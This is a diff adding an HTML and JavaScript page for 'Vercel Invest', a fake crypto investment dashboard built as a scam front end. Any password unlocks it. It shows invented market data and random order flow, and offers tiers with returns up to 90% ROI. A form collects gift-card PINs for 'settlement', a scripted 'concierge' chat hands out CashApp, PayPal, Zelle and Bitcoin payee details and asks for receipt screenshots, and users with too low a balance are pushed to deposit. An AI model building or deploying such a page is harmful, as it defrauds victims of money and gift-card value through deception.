@@ -1,0 +1,912 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vercel Invest Dashboard</title>
+    <link rel="icon" type="image/png" sizes="50x50" href="/favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&family=Outfit:wght@300;400;600;700&display=swap"
+        rel="stylesheet">
+
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script> (function () { emailjs.init("YOUR_PUBLIC_KEY"); })(); </script>
+
+    <style>
+        /* ================= DESIGN SYSTEM ================= */
+        :root {
+            --bg: #02040a;
+            --panel: #0d1117;
+            --panel-2: #161b22;
+            --border: #30363d;
+            --accent: #2f81f7;
+            --accent-soft: rgba(47, 129, 247, .15);
+            --success: #3fb950;
+            --danger: #f85149;
+            --text: #ffffff;
+            --muted: #8b949e;
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        html,
+        body {
+            margin: 0;
+            height: 100%;
+            background: var(--bg);
+            color: var(--text);
+            font-family: Outfit, system-ui;
+            overflow: hidden;
+        }
+
+        .mono {
+            font-family: "JetBrains Mono", monospace
+        }
+
+        .text-white {
+            color: #ffffff !important;
+        }
+
+        /* ================= GATEKEEPER ================= */
+        #gatekeeper {
+            position: fixed;
+            inset: 0;
+            z-index: 10000;
+            background: radial-gradient(circle at top, #0d1117, #02040a);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .auth-card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 22px;
+            padding: 40px;
+            position: relative;
+        }
+
+        .scan-line {
+            position: absolute;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: var(--accent);
+            animation: scan 2.8s infinite;
+        }
+
+        @keyframes scan {
+            0% {
+                top: 0
+            }
+
+            50% {
+                top: 100%
+            }
+
+            100% {
+                top: 0
+            }
+        }
+
+        /* ================= APP LAYOUT ================= */
+        .app {
+            display: none;
+            height: 100%;
+            flex-direction: column
+        }
+
+        .header {
+            height: 72px;
+            background: var(--panel);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 24px;
+        }
+
+        .wrapper {
+            flex: 1;
+            display: flex;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .sidebar {
+            width: 280px;
+            background: var(--panel);
+            border-right: 1px solid var(--border);
+            display: flex;
+            flex-direction: column;
+            transition: .3s;
+            z-index: 1050;
+        }
+
+        .sidebar .nav-item {
+            padding: 16px 24px;
+            cursor: pointer;
+            display: flex;
+            gap: 14px;
+            align-items: center;
+            color: var(--muted);
+            border-right: 3px solid transparent;
+        }
+
+        .sidebar .nav-item.active {
+            background: var(--accent-soft);
+            color: var(--accent);
+            border-right-color: var(--accent);
+        }
+
+        .main {
+            flex: 1;
+            padding: 26px;
+            overflow-y: auto;
+            background: radial-gradient(circle at top left, var(--panel-2), var(--bg));
+        }
+
+        .rightbar {
+            width: 300px;
+            background: var(--panel);
+            border-left: 1px solid var(--border);
+            padding: 20px;
+        }
+
+        /* ================= CARDS ================= */
+        .cardx {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 18px;
+            padding: 20px;
+            transition: .25s;
+            height: 100%;
+            color: white;
+        }
+
+        .cardx:hover {
+            border-color: var(--accent)
+        }
+
+        .btn-accent {
+            background: var(--accent);
+            border: none;
+            color: white;
+        }
+
+        /* ================= CHAT ================= */
+        .chat-body {
+            height: 340px;
+            overflow-y: auto;
+            padding: 20px;
+            background: #05070a;
+        }
+
+        .msg {
+            max-width: 85%;
+            padding: 12px 16px;
+            border-radius: 14px;
+            margin-bottom: 12px;
+            font-size: .9rem;
+            line-height: 1.4;
+        }
+
+        .msg.user {
+            background: var(--accent);
+            color: white;
+            margin-left: auto;
+            border-bottom-right-radius: 2px;
+        }
+
+        .msg.manager {
+            background: #21262d;
+            border: 1px solid var(--border);
+            border-bottom-left-radius: 2px;
+        }
+
+        /* ================= TOAST ================= */
+        .toast-hub {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            z-index: 20000;
+        }
+
+        .toastx {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--accent);
+            border-radius: 8px;
+            padding: 12px 18px;
+            margin-top: 10px;
+            animation: pop .3s ease;
+        }
+
+        @media(max-width:992px) {
+            .sidebar {
+                position: absolute;
+                left: -280px;
+                top: 0;
+                bottom: 0;
+                box-shadow: 20px 0 50px #000;
+            }
+
+            .sidebar.active {
+                left: 0
+            }
+
+            .rightbar {
+                display: none
+            }
+        }
+
+        #overlay {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: rgba(0, 0, 0, 0.6);
+            z-index: 1040;
+        }
+
+        #overlay.active {
+            display: block;
+        }
+
+        .bybit-header {
+            height: 64px;
+            background: #0b0e11;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .brand-text {
+            font-family: 'Inter', monospace;
+            font-weight: 600;
+            font-size: 1rem;
+            color: #fff;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-icon {
+            background: transparent;
+            color: #9ca3af;
+            border: none;
+        }
+
+        .btn-icon:hover {
+            color: #fff;
+        }
+
+        .balance-box {
+            background: #111827;
+            padding: 6px 12px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .balance-label {
+            font-size: 0.75rem;
+            color: #9ca3af;
+        }
+
+        .balance-amount {
+            font-weight: 600;
+            color: #22c55e;
+        }
+
+        .balance-eye {
+            cursor: pointer;
+            color: #9ca3af;
+            font-size: 0.85rem;
+        }
+
+        .balance-eye:hover {
+            color: #fff;
+        }
+
+        .user-avatar {
+            width: 34px;
+            height: 34px;
+            border-radius: 50%;
+            background: #111827;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #9ca3af;
+            border: 1px solid rgba(255, 255, 255, 0.06);
+        }
+
+        .user-avatar:hover {
+            color: #fff;
+        }
+    </style>
+</head>
+
+<body>
+    <div id="overlay" onclick="toggleSide()"></div>
+
+    <div id="gatekeeper">
+        <div class="auth-card text-center">
+            <div class="scan-line"></div>
+            <i class="fas fa-lock fa-4x text-primary mb-3"></i>
+            <h5 class="fw-bold text-white" data-i18n="auth_header">Access Your Dashboard</h5>
+            <input id="pass" type="password"
+                class="form-control bg-dark border-secondary text-white text-center mono py-3 mt-3"
+                data-i18n-placeholder="session_key_placeholder" placeholder="SESSION KEY">
+            <button class="btn btn-accent w-100 py-3 mt-3 fw-bold" onclick="auth()" data-i18n="verify_btn">
+                <i class="fas fa-shield-check me-2"></i>VERIFY
+            </button>
+        </div>
+    </div>
+
+    <div class="app" id="app">
+        <div class="header bybit-header d-flex justify-content-between align-items-center px-4">
+            <div class="d-flex align-items-center gap-3">
+                <button class="btn btn-icon d-lg-none" onclick="toggleSide()">
+                    <i class="fas fa-bars"></i>
+                </button>
+
+                <div class="brand d-flex align-items-center gap-2">
+                    <i class="fas fa-piggy-bank text-primary fs-5"></i>
+                    <span class="brand-text">
+                        <span data-i18n="brand_name">Vercel</span><span class="text-primary"
+                            data-i18n="brand_suffix">INVEST</span>
+                    </span>
+                </div>
+            </div>
+
+            <div class="d-flex align-items-center gap-4">
+                <div class="balance-box d-flex align-items-center gap-2">
+                    <span class="balance-label" data-i18n="total_balance">Total Balance</span>
+                    <span id="balanceDisplay" class="balance-amount">$0.00</span>
+                    <i class="fas fa-eye balance-eye" id="eyeIcon" onclick="toggleBalance()"></i>
+                </div>
+
+                <div class="lang">
+                    <select id="langSelect" class="form-select form-select-sm bg-dark text-white border-secondary"
+                        style="width:auto">
+                        <option value="en">English</option>
+                        <option value="fr">Français</option>
+                        <option value="es">Español</option>
+                        <option value="pt">Português</option>
+                        <option value="de">Deutsch</option>
+                    </select>
+                </div>
+
+                <div class="user-avatar">
+                    <i class="fas fa-user"></i>
+                </div>
+            </div>
+        </div>
+
+        <div class="wrapper">
+            <div class="sidebar" id="side">
+                <div class="nav-item active" onclick="nav('market',this)">
+                    <i class="fas fa-chart-line"></i><span data-i18n="nav_market">Market</span>
+                </div>
+                <div class="nav-item" id="nav-portfolio" onclick="nav('portfolio',this)">
+                    <i class="fas fa-briefcase"></i><span data-i18n="nav_portfolios">Portfolios</span>
+                </div>
+                <div class="nav-item" id="nav-fund" onclick="nav('fund',this)">
+                    <i class="fas fa-wallet"></i><span data-i18n="nav_fund">Capital Fund</span>
+                </div>
+                <div class="nav-item" onclick="openChat()">
+                    <i class="fas fa-user-shield"></i><span data-i18n="nav_concierge">Concierge</span>
+                </div>
+            </div>
+
+            <div class="main">
+                <div id="v-market">
+                    <div class="cardx p-0 overflow-hidden mb-4" style="height:520px">
+                        <div id="tv_chart" style="height:100%"></div>
+                    </div>
+
+                    <div class="row g-4 mb-4">
+                        <div class="col-md-4">
+                            <div class="cardx">
+                                <small class="mono text-white">
+                                    <i class="fas fa-chart-area me-2"></i><span data-i18n="volatility_title">24H
+                                        VOLATILITY</span>
+                                </small>
+                                <h4 class="text-white mt-3 fw-bold">1.82%</h4>
+                                <small class="text-white d-block mt-2" data-i18n="btc_fluctuation">Bitcoin Price
+                                    Fluctuation</small>
+                                <div class="progress mt-3" style="height: 4px; background: #21262d;">
+                                    <div class="progress-bar bg-primary" style="width: 65%"></div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="cardx border-success">
+                                <small class="mono text-white">
+                                    <i class="fas fa-thumbs-up me-2"></i><span data-i18n="sentiment_title">BULLISH
+                                        SENTIMENT</span>
+                                </small>
+                                <h4 class="text-success mt-3 fw-bold">78.4%</h4>
+                                <small class="text-white d-block" data-i18n="market_consensus">Global Market
+                                    Consensus</small>
+                                <small class="text-white d-block mt-2">
+                                    <i class="fas fa-arrow-up text-success me-1"></i><span
+                                        data-i18n="trending_up">Trending Upward</span>
+                                </small>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="cardx">
+                                <small class="mono text-white">
+                                    <i class="fas fa-bolt me-2"></i><span data-i18n="hashrate_title">NETWORK HASH
+                                        RATE</span>
+                                </small>
+                                <h4 class="text-white mt-3 fw-bold">642.1 EH/s</h4>
+                                <small class="text-white d-block" data-i18n="computing_power">Network Computing
+                                    Power</small>
+                                <small class="text-success d-block mt-2">
+                                    <i class="fas fa-caret-up"></i> <span data-i18n="hashrate_change">+0.4% vs
+                                        24H</span>
+                                </small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="v-portfolio" class="d-none">
+                    <div class="row g-4" id="tiers"></div>
+                </div>
+
+                <div id="v-fund" class="d-none">
+                    <div class="row g-4">
+                        <div class="col-lg-8">
+                            <div class="cardx">
+                                <h5 class="fw-bold mb-4 text-white">
+                                    <i class="fas fa-university text-primary me-2"></i><span
+                                        data-i18n="deposit_funds_header">Deposit Funds</span>
+                                </h5>
+                                <div class="row g-3">
+                                    <div class="col-6 col-md-4">
+                                        <button type="button" class="btn btn-outline-secondary w-100 py-4 text-white"
+                                            onclick="openChat('CashApp')">
+                                            <i class="fas fa-dollar-sign d-block mb-2 text-success fa-2x"></i>
+                                            <strong data-i18n="method_cashapp">CashApp</strong>
+                                        </button>
+                                    </div>
+                                    <div class="col-6 col-md-4">
+                                        <button type="button" class="btn btn-outline-secondary w-100 py-4 text-white"
+                                            onclick="openChat('PayPal')">
+                                            <i class="fab fa-paypal d-block mb-2 text-primary fa-2x"></i>
+                                            <strong data-i18n="method_paypal">PayPal</strong>
+                                        </button>
+                                    </div>
+                                    <div class="col-6 col-md-4">
+                                        <button type="button" class="btn btn-outline-secondary w-100 py-4 text-white"
+                                            onclick="openChat('Zelle')">
+                                            <i class="fas fa-bolt d-block mb-2 text-warning fa-2x"></i>
+                                            <strong data-i18n="method_zelle">Zelle</strong>
+                                        </button>
+                                    </div>
+                                    <div class="col-6 col-md-4">
+                                        <button type="button" class="btn btn-outline-secondary w-100 py-4 text-white"
+                                            onclick="openChat('Stripe')">
+                                            <i class="fab fa-stripe d-block mb-2 text-info fa-2x"></i>
+                                            <strong data-i18n="method_stripe">Stripe</strong>
+                                        </button>
+                                    </div>
+                                    <div class="col-6 col-md-4">
+                                        <button type="button" class="btn btn-outline-secondary w-100 py-4 text-white"
+                                            onclick="openChat('Google Pay')">
+                                            <i class="fab fa-google text-danger d-block mb-2 fa-2x"></i>
+                                            <strong data-i18n="method_googlepay">Google Pay</strong>
+                                        </button>
+                                    </div>
+                                    <div class="col-6 col-md-4">
+                                        <button type="button" class="btn btn-outline-secondary w-100 py-4 text-white"
+                                            onclick="openChat('Apple Pay')">
+                                            <i class="fab fa-apple d-block mb-2 text-white fa-2x"></i>
+                                            <strong data-i18n="method_applepay">Apple Pay</strong>
+                                        </button>
+                                    </div>
+                                </div>
+
+                                <div class="mt-4 p-4 bg-black rounded border border-secondary shadow-lg">
+                                    <div class="d-flex justify-content-between align-items-center mb-3">
+                                        <label class="small mono text-white fw-bold">
+                                            <i class="fas fa-gift me-2 text-danger"></i><span
+                                                data-i18n="gift_card_label">GIFT CARD SETTLEMENT</span>
+                                        </label>
+                                    </div>
+                                    <div
+                                        class="d-flex gap-3 align-items-center bg-dark px-3 py-1 rounded-pill border border-secondary border-opacity-50">
+                                        <i class="fab fa-apple text-white"></i>
+                                        <i class="fab fa-steam text-white"></i>
+                                        <i class="fab fa-google-play text-white"></i>
+                                        <span class="mono x-small text-white" style="font-size: 10px;"
+                                            data-i18n="paysafe_tag">PAYSAFE</span>
+                                    </div>
+                                </div>
+                                <div class="input-group mb-3">
+                                    <input id="vCode" class="form-control bg-black border-secondary text-white mono"
+                                        data-i18n-placeholder="pin_placeholder" placeholder="ENTER CARD PIN">
+                                    <button type="button" class="btn btn-primary fw-bold px-4" id="vBtn"
+                                        onclick="redeem()" data-i18n="redeem_btn">
+                                        <i class="fas fa-barcode me-2"></i>REDEEM
+                                    </button>
+                                </div>
+                                <small class="text-white d-block mb-3" data-i18n="redeem_info">
+                                    Redeem your gift card to add funds instantly. Accepted cards include VERCEL, PayPal,
+                                    and CashApp.
+                                </small>
+                                <div class="alert alert-info alert-sm p-2 mb-0">
+                                    <i class="fas fa-circle-info me-2"></i>
+                                    <small data-i18n="redemption_limits">Minimum redemption: $100 | Processing:
+                                        <strong>Instant</strong></small>
+                                </div>
+                            </div>
+
+                            <div class="mt-4">
+                                <div class="cardx bg-black">
+                                    <h6 class="fw-bold mb-4 mono small text-white">
+                                        <i class="fas fa-microchip text-primary me-2"></i><span
+                                            data-i18n="nodes_title">SYSTEM NODES</span>
+                                    </h6>
+                                    <div class="mb-4">
+                                        <small class="mono text-white d-block mb-1" data-i18n="crypto_btc">BITCOIN
+                                            (BTC)</small>
+                                        <div
+                                            class="d-flex justify-content-between align-items-center bg-dark p-3 rounded border border-secondary mb-2">
+                                            <code class="small text-truncate text-success"
+                                                id="btc1">bc1qj0sh9ayp7v9z2lkr7</code>
+                                            <i class="fas fa-copy text-primary pointer" onclick="copy('btc1')"></i>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="rightbar">
+                <h6 class="fw-bold mono mb-3 small text-white" data-i18n="order_flow_title">LIVE ORDER FLOW</h6>
+                <div id="orders" class="mono small"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal fade" id="chatM">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content cardx p-0">
+                <div class="p-3 border-bottom border-secondary d-flex justify-content-between align-items-center">
+                    <strong id="chatTitle" class="text-white">
+                        <i class="fas fa-user-tie me-2"></i><span data-i18n="concierge_title">Concierge</span>
+                    </strong>
+                    <button class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="chat-body" id="chatBody"></div>
+                <div class="p-3 bg-black">
+                    <div class="input-group">
+                        <input id="chatInput" class="form-control bg-dark border-0 text-white"
+                            data-i18n-placeholder="chat_placeholder" placeholder="Message assistant...">
+                        <button class="btn btn-accent px-4" onclick="sendChat()">
+                            <i class="fas fa-paper-plane"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="toast-hub" id="toastHub"></div>
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="https://s3.tradingview.com/tv.js"></script>
+
+    <script>
+        // --- STATE MANAGEMENT ---
+        let BAL = 0;
+        let isHidden = false;
+        let currentMethod = "General";
+        let currentLang = localStorage.getItem("lang") || "en";
+        const MODAL_EL = document.getElementById('chatM');
+        // Ensure Bootstrap is loaded before initializing Modal
+        const MODAL = MODAL_EL ? new bootstrap.Modal(MODAL_EL) : null;
+
+        // --- CONFIGURATION ---
+        const PAYMENT_METHODS = {
+            'CashApp': { title: "CASHAPP TAG", val: "$PIGGY_OFFICIAL", class: "text-success" },
+            'PayPal': { title: "PAYPAL EMAIL", val: "payments@piggyinvest.global", class: "text-primary" },
+            'Zelle': { title: "ZELLE RECIPIENT", val: "settle@piggyinvest.global", class: "text-warning" },
+            'ApplePay': { title: "APPLE PAY ID", val: "apple-terminal-09@icloud.com", class: "" },
+            'Stripe': { title: "STRIPE NODE", val: "STRIPE-PI-88210", class: "" },
+            'Google': { title: "GOOGLE PAY", val: "pay-terminal-node-99@gmail.com", class: "" },
+            'Default': { title: "TERMINAL ID", val: "VERCELINVEST-2025<br><strong>ROUTING:</strong> 021000021", class: "" }
+        };
+
+        const TIERS_DATA = [
+            { n: "Starter", m: 500, r: "12%", desc: "Entry-level diversification", reason: "Blue-chip stocks.", returns: "Monthly", key: "tier_starter" },
+            { n: "Executive", m: 5000, r: "25%", desc: "Advanced growth strategy", reason: "Emerging markets.", returns: "Quarterly", key: "tier_executive" },
+            { n: "Sovereign", m: 50000, r: "48%", desc: "Premium wealth acceleration", reason: "Private equity.", returns: "Bi-annual", key: "tier_sovereign" },
+            { n: "Elite", m: 500000, r: "90%", desc: "Ultra-premium institutional", reason: "IPO allocations.", returns: "Custom", key: "tier_elite" }
+        ];
+
+        // --- INITIALIZATION ---
+        function auth() {
+            const pass = document.getElementById('pass');
+            const gatekeeper = document.getElementById('gatekeeper');
+            const app = document.getElementById('app');
+
+            if (!pass.value) return;
+            gatekeeper.remove();
+            app.style.display = "flex";
+            init();
+        }
+
+        function init() {
+            if (typeof TradingView !== 'undefined') {
+                new TradingView.widget({ autosize: true, symbol: "BITSTAMP:BTCUSD", interval: "30", theme: "dark", container_id: "tv_chart" });
+            }
+            renderTiers();
+            runOrders();
+            applyLanguage(currentLang);
+            toast("SECURE SESSION ESTABLISHED");
+        }
+
+        // --- CORE LOGIC ---
+        function toggleBalance() {
+            isHidden = !isHidden;
+            const eye = document.getElementById('eyeIcon');
+            const display = document.getElementById('balanceDisplay');
+            if (isHidden) {
+                display.innerText = "******";
+                eye.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                display.innerText = `$${BAL.toLocaleString()}.00`;
+                eye.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
+        function redeem() {
+            const vCode = document.getElementById('vCode');
+            const vBtn = document.getElementById('vBtn');
+            const code = vCode.value;
+
+            if (!code) return toast("INVALID CODE", "danger");
+
+            vBtn.disabled = true;
+            // Simulating API call
+            // emailjs.send("SERVICE_ID", "TEMPLATE_ID", { voucher: code }); 
+
+            setTimeout(() => {
+                if (code.toLowerCase().includes("piggy")) {
+                    BAL += 1000;
+                    if (!isHidden) document.getElementById('balanceDisplay').innerText = `$${BAL.toLocaleString()}.00`;
+                    toast("CARD REDEEMED: $1,000", "success");
+                } else {
+                    toast("SUBMITTED FOR REVIEW");
+                }
+                vBtn.disabled = false;
+                vCode.value = "";
+            }, 1000);
+        }
+
+        function nav(v, el) {
+            document.querySelectorAll('[id^="v-"]').forEach(x => x.classList.add('d-none'));
+            const target = document.getElementById('v-' + v);
+            if (target) target.classList.remove('d-none');
+
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            if (el) el.classList.add('active');
+        }
+
+        function investTrigger(amount) {
+            if (BAL < amount) {
+                toast("INSUFFICIENT BALANCE - REDIRECTING", "danger");
+                setTimeout(() => {
+                    const fundBtn = document.getElementById('nav-fund');
+                    nav('fund', fundBtn);
+                }, 1500);
+            } else {
+                // Deduct balance logic could go here
+                toast("INVESTMENT SUCCESSFUL", "success");
+            }
+        }
+
+        function renderTiers() {
+            const container = document.getElementById('tiers');
+            if (!container) return;
+
+            container.innerHTML = TIERS_DATA.map(t => `
+        <div class="col-md-6 col-xl-3">
+            <div class="cardx">
+                <small class="mono text-white text-uppercase" data-i18n="${t.key}_name">${t.n}</small>
+                <h3 class="mono my-3 text-white">$${t.m.toLocaleString()}</h3>
+                <small class="text-white d-block mb-3" data-i18n="${t.key}_desc">${t.desc}</small>
+                <p class="small text-white mb-3"><i class="fas fa-info-circle text-primary me-2"></i><span data-i18n="${t.key}_reason">${t.reason}</span></p>
+                <div class="text-success fw-bold mb-3"><i class="fas fa-chart-line me-2"></i>${t.r} <span data-i18n="roi">ROI</span></div>
+                <small class="text-white d-block mb-3"><i class="fas fa-coins text-warning me-2"></i><span data-i18n="${t.key}_returns">${t.returns}</span></small>
+                <button class="btn btn-accent w-100 fw-bold" onclick="investTrigger(${t.m})" data-i18n="execute">EXECUTE</button>
+            </div>
+        </div>`).join('');
+        }
+
+        // --- CHAT SYSTEM ---
+        function openChat(method = "Support") {
+            currentMethod = method;
+            const chatTitle = document.getElementById('chatTitle');
+            const chatBody = document.getElementById('chatBody');
+
+            // Use i18n keys for the title and initial message
+            chatTitle.innerHTML = `<i class="fas fa-user-tie me-2"></i> <span data-i18n="concierge_title">Concierge</span>: ${method}`;
+            chatBody.innerHTML = `<div class="msg manager" data-i18n="secure_line">Secure line established.</div>`;
+
+            if (MODAL) MODAL.show();
+
+            // Re-apply language so the new chat content gets translated immediately
+            applyLanguage(currentLang);
+        }
+
+        function sendChat() {
+            const chatInput = document.getElementById('chatInput');
+            const fileInput = document.getElementById('chatFileInput');
+            const chatBody = document.getElementById('chatBody');
+            const val = chatInput.value;
+
+            if (!val && (!fileInput || !fileInput.files.length)) return;
+
+            if (val) {
+                chatBody.innerHTML += `<div class="msg user">${val}</div>`;
+                chatInput.value = "";
+            }
+
+            setTimeout(() => {
+                // Get method details from config object
+                const methodData = PAYMENT_METHODS[currentMethod] || PAYMENT_METHODS['Default'];
+
+                const details = `<strong data-i18n="official_data">OFFICIAL DATA:</strong><br>
+                             <strong>${methodData.title}:</strong><br>
+                             <code class="${methodData.class}">${methodData.val}</code>`;
+
+                chatBody.innerHTML += `
+            <div class="msg manager">
+                <div class="p-2 border border-secondary rounded bg-black mb-2">
+                    ${details}
+                </div>
+                <small class="text-white-50" data-i18n="upload_receipt">Please upload receipt.</small>
+            </div>`;
+
+                chatBody.scrollTop = chatBody.scrollHeight;
+
+                if (fileInput && fileInput.files.length > 0) {
+                    const file = fileInput.files[0];
+                    chatBody.innerHTML += `<div class="msg manager"><span data-i18n="receipt_detected">Receipt detected</span>: <strong>${file.name}</strong></div>`;
+
+                    // emailjs.send(...) // Simulating send
+                    fileInput.value = "";
+                }
+
+                // Re-apply language to translate the new response
+                applyLanguage(currentLang);
+                chatBody.scrollTop = chatBody.scrollHeight;
+
+            }, 1000);
+        }
+
+        function runOrders() {
+            const orders = document.getElementById('orders');
+            if (!orders) return;
+
+            setInterval(() => {
+                const d = document.createElement('div');
+                d.className = "d-flex justify-content-between mb-1";
+                // Randomly choose Buy or Sell for more realism
+                const isBuy = Math.random() > 0.4;
+                d.innerHTML = `<span class="${isBuy ? 'text-success' : 'text-danger'} small">${isBuy ? 'BUY' : 'SELL'}</span><span class="small text-white">${(Math.random() * 2).toFixed(3)} BTC</span>`;
+
+                orders.prepend(d);
+                if (orders.children.length > 15) orders.lastChild.remove();
+            }, 2300);
+        }
+
+        // --- UTILITIES ---
+        function toggleSide() {
+            document.getElementById('side').classList.toggle('active');
+            document.getElementById('overlay').classList.toggle('active');
+        }
+
+        function toast(m, type = "accent") {
+            const toastHub = document.getElementById('toastHub');
+            if (!toastHub) return;
+
+            const d = document.createElement('div');
+            d.className = 'toastx mono small text-white';
+            if (type === "danger") d.style.borderLeftColor = "red";
+            if (type === "success") d.style.borderLeftColor = "#00ff88"; // Piggy Green
+            d.innerText = m;
+            toastHub.appendChild(d);
+            setTimeout(() => d.remove(), 3000);
+        }
+
+        function copy(id) {
+            const el = document.getElementById(id);
+            if (el) {
+                navigator.clipboard.writeText(el.innerText);
+                toast("COPIED TO CLIPBOARD");
+            }
+        }
+
+        // --- I18N ---
+        const i18n = {
+            en: {
+                // General
+                buy: "BUY",
+                execute: "EXECUTE",
+                roi: "ROI",
+                // Tiers (Ensure these match renderTiers keys)
+                tier_starter_name: "Starter",
+                tier_starter_desc: "Entry-level diversification",
+                tier_starter_reason: "Blue-chip stocks",
+                tier_starter_returns: "Monthly dividends",
+                // Chat
+                concierge_title: "Concierge",
+                secure_line: "Secure line established. Please state deposit amount.",
+                official_data: "OFFICIAL DATA:",
+                upload_receipt: "Please upload a screenshot of your receipt.",
+                receipt_detected: "Receipt detected",
+                // Add other keys here...
+            },
+            fr: {
+                buy: "ACHETER",
+                execute: "EXÉCUTER",
+                roi: "RSI",
+                tier_starter_name: "Débutant",
+                tier_starter_desc: "Diversification d'entrée",
+                tier_starter_reason: "Actions de premier ordre",
+                tier_starter_returns: "Dividendes mensuels",
+                concierge_title: "Conciergerie",
+                secure_line: "Ligne sécurisée établie. Veuillez indiquer le montant.",
+                official_data: "DONNÉES OFFICIELLES :",
+                upload_receipt: "Veuillez télécharger votre reçu.",
+                receipt_detected: "Reçu détecté",
+            }
+        };
+
+        function applyLanguage(lang) {
+            currentLang = lang;
+            localStorage.setItem("lang", lang);
+
+            document.querySelectorAll("[data-i18n]").forEach(el => {
+                const key = el.getAttribute("data-i18n");
+                let translation = i18n[lang]?.[key];
+
+                // Fallback to English if translation missing
+                if (!translation && lang !== 'en') translation = i18n['en']?.[key];
+
+                if (translation) {
+                    // If the element has specific children/formatting, innerHTML is risky, 
+                    // but for this specific app it works.
+                    el.innerHTML = translation;
+                }
+            });
+        }
+
+        // Event Listeners
+        document.addEventListener("DOMContentLoaded", () => {
+            const select = document.getElementById("langSelect");
+            if (select) {
+                select.value = currentLang;
+                select.addEventListener("change", () => applyLanguage(select.value));
+            }
+            // Initial apply
+            applyLanguage(currentLang);
+        });
+    </script>
+</body>
+
+</html>
